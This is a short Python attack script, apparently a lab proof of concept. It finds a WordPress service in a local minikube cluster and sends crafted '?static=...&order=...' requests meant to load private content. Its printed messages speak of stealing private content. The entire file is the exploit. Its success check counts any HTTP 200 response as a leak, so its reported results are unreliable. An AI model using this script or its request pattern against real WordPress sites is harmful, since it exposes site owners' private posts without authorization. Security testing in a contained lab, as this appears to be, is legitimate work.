import requests
import subprocess
import random
import string

get_service = subprocess.run(['minikube', 'service', 'wordpress', '--url'], stdout=subprocess.PIPE)
service_url = get_service.stdout.decode('utf-8').strip()
print(f"Service IP: {service_url}")

url = f'{service_url}/?static=1&order=asc'

for i in range(10):
    response = requests.get(url)
    random_string = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
    url = f"{service_url}/?static={random.randint(0, 9)}&order={random_string}"
    if response.status_code == 200:
        print("Private Content Loaded")
    else:
        print("Failed to Steal Private Content")